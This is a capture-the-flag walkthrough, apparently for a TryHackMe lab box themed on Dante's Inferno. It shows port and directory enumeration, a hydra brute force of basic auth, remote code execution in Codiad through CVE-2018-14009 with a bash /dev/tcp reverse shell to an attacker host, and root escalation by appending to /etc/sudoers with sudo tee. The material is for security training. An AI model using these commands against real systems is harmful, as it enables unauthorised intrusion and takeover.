# Try Hack Me - IDE

**Categories:** Security, Inferno, Vulnhub, OSCP  
**Difficulty:** Medium  

Commands used in this guide use the exported variable $IP (`export IP=10.10.154.171`) in place of the target machine's IP address.

## 1. Enumeration - nmap, gobuster

Having launched the machine, we perform a full TCP port scan with nmap, revealing a total of 90 open ports : 

```console
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- $IP -oN nmap.txt
Nmap scan report for 10.10.154.171
Host is up (0.098s latency).
Not shown: 65445 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
23/tcp    open  telnet
25/tcp    open  smtp
80/tcp    open  http
88/tcp    open  kerberos-sec
...snip...
```

So obviously something is going on with these ports. I wrote a [simple banner grabber in python](./banner_grab.py) that connected to each port discovered by nmap to see if this was some kind of "needle in the haystack" challenge, but only 22 responded with a banner : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/inferno]
└─$ python3 banner_grap.py
21      timeout...
22      b'SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3\r\n'
23      timeout...
25      timeout...
80      timeout...
```

There is however an application on 80 running Apache 2.4.29, and navigating to the application reveals Canto 34 of Dante's Inferno, and a .jpg image : 

```html
┌──(kali㉿kali)-[~]
└─$ curl $IP  
...snip...
<div class="center">
  <p style="color:white">
    Oh quanto parve a me gran maraviglia</br> 
    quand'io vidi tre facce a la sua testa!</br> 
    L'una dinanzi, e quella era vermiglia;</br>
...snip...
<img src="1.jpg" alt="" width="800" height="600">
...snip...
```

With Google / searchsploit giving no relevant vulnerabilities for the discovered SSH and Apache versions, we turn to a gobuster scan of the application on 80 using dirbuster's medium wordlist, revealing the `/inferno` route : 

```console
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u $IP -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
...snip...
/inferno              (Status: 401) [Size: 460]
```

Attempting to navigate to the newly discovered route shows that it is protected by [Basic Auth](https://en.wikipedia.org/wiki/Basic_access_authentication) :


```console
┌──(kali㉿kali)-[~]
└─$ curl $IP/inferno/ -I
HTTP/1.1 401 Unauthorized
Date: Thu, 21 Oct 2021 05:08:01 GMT
Server: Apache/2.4.29 (Ubuntu)
WWW-Authenticate: Basic realm="Restricted Content"
Content-Type: text/html; charset=iso-8859-1
```

## 2. Basic auth brute force - hydra

Given that we haven't discovered any possible credentials, we'll make a short list of possible users (`echo 'admin\nroot\ndante' > users.txt`) and attempt to brute force the basic auth using hydra's http-get mode and rockyou. This takes a little while (which is why we wanted to keep the list of possible usernames as short as possible), but eventually returns valid credentials for the `/inferno` route : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/inferno]
└─hydra -L users.txt -P rockyou -f $IP http-get /inferno
...snip...
[STATUS] 3023.67 tries/min, 9071 tries in 00:03h, 43024126 to do in 237:10h, 16 active
[80][http-get] host: 10.10.108.143   login: USERNAME   password: PASSWORD
```

These credentials provide access to a login page for [Codiad, an in-browser cloud IDE that is no longer actively supported](http://codiad.com/) and also provide access to the Codiad application.

## 3. Foothold - CVE-2018-14009

Google and searchsploit give a number of CVEs and exploit scripts for Codiad. After reading through the searchsploit results, we opt for [Wang Yihang's exploit for CVE-2081-14009](https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit), providing RCE through a body parameter that is injected directly into a call to [shell_exec](https://www.php.net/manual/en/function.shell-exec.php). The exploit script is well documented and requires that we set up two nc listeners, one to serve the injected command and one to catch the resulting shell session (note that we've added the basic auth creds to the target URL) : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/inferno]
└─$ python3 ./exp.py http://admin:dante1@$IP/inferno/ admin dante1 10.6.76.88 80 linux
[+] Please execute the following command on your vps: 
echo 'bash -c "bash -i >/dev/tcp/ATTACK-IP/81 0>&1 2>&1"' | nc -lnvp 80
nc -lnvp 81
[+] Please confirm that you have done the two command above [y/n]
```

Having set up the listeners, we continue the exploit and the reverse shell connects to the listener on 81 : 

```console
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 81
listening on [any] 81 ...
connect to [ATTACK-IP] from (UNKNOWN) [10.10.154.171] 41826
www-data@Inferno:/var/www/html/inferno/components/filemanager$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

After a minute or so our shell session disconnects and this happens every time we attempt the exploit. Immediately switching to a `sh` shell prevents this from happening - there is presumably some script on the box that is periodically killing bash sessions.

## 4. Privesc, www-data -> dante - credential discovery

Catting `/etc/passwd` reveals 1 non-system / non-root user dante, and navigating to `/home/dante` we find a large number of files in `./Downloads`, `./Desktop` and `./Documents` named after cantos and characters from the Divine Comedy : 

```console
ls -la ./Documents
total 464
drwxr-xr-x  2 root  root    4096 Jan 11  2021 .
drwxr-xr-x 13 dante dante   4096 Jan 11  2021 ..
-rwxr-xr-x  1 root  root   35312 Jan 11  2021 beatrice.doc
-rwxr-xr-x  1 root  root   63704 Jan 11  2021 caronte.doc
-rwxr-xr-x  1 root  root  133792 Jan 11  2021 centauro.doc
...snip...
```

On closer inspection, these are not documents but system utilities - `/home/dante/Documents/beatrice.doc` is netcat, for example :

```console
./Documents/beatrice.doc --version
./Documents/beatrice.doc: invalid option -- '-'
usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]
          [-m minttl] [-O length] [-P proxy_username] [-p source_port]
          [-q seconds] [-s source] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout]
          [-X proxy_protocol] [-x proxy_address[:port]]           [destination] [port]
```

In `/home/dante/Downloads` we find a file `download.dat` that contains a string of hex characters (everything goes a bit CTF here). Decoding the file with `xxd -p -r` reveals another canto of the Divine Comedy alongside a credential pair for the dante user : 

```console
┌──(kali㉿kali)-[~/Documents/tthm/inferno]
└─$ cat .download.dat| xxd -p -r
Or se’ tu quel Virgilio e quella fonte
che spandi di parlar sì largo fiume?»,

...snip...

Vedi la bestia per cu’ io mi volsi;
aiutami da lei, famoso saggio,
ch’ella mi fa tremar le vene e i polsi».

dante:PASSWORD
```

We can use the discovered credentials to connect as dante over ssh. The user flag is at `/home/dante/local.txt`.

## 5. Privesc, dante -> root - tee, GTFObins

The bash killer is still active on the system, so after connecting as dante we again switch to an `sh` shell. Running `sudo -l` as the dante user shows that they can run `/usr/bin/tee` as root : 

```console
$ sudo -l
User dante may run the following commands on Inferno:
    (root) NOPASSWD: /usr/bin/tee
```

This effectively gives us [root-level write access to the system](https://gtfobins.github.io/gtfobins/tee/), opening up a number of privesc options : 

* Writing a modified version of `/etc/passwd` or `/etc/shadow`, changing the root password or the dante user UID/GID, or adding a new user with UID/GID of 0
* Appending a cronjob to `/etc/crontab` that runs an arbitrary script as root (executing a reverse shell, copying a bash SUID binary to `/tmp`, etc.)  
* Appending an entry to `/etc/sudoers` that allows the dante user to run any command as root.

In an effort to keep things as simple as possible, we'll go for the final option, using the `-a` flag to append a line to `/etc/sudoers` :

```console
$ echo "dante ALL=(ALL) NOPASSWD: ALL" | sudo /usr/bin/tee -a /etc/sudoers
dante ALL=(ALL) NOPASSWD: ALL
```

Running `sudo -l` again, we can see the new entry for dante : 

```console
$ sudo -l
User dante may run the following commands on Inferno:
    (root) NOPASSWD: /usr/bin/tee
    (ALL) NOPASSWD: ALL
```

that allows us to privesc to root : 

```console
$ sudo su
root@Inferno:/home/dante# id
uid=0(root) gid=0(root) groups=0(root)
```

The root flag is at `/root/proof.txt`. But the bash killer is still active! So let's switch to `sh` again, and look at root's crontab : 

```console
# crontab -l
* * * * * sh /var/www/html/machine_services1320.sh
```

Cron is running the `machine_services1320.sh` script as root every minute. Catting the script we find the call to `pskill bash` that is killing our bash sessions, as well as a long chain of nc listeners that we saw in our initial nmap scan : 

```console
# cat /var/www/html/machine_services1320.sh
pkill bash &
nc -nvlp 21 &
nc -nvlp 23 &
nc -nvlp 25 &
....snip...
```
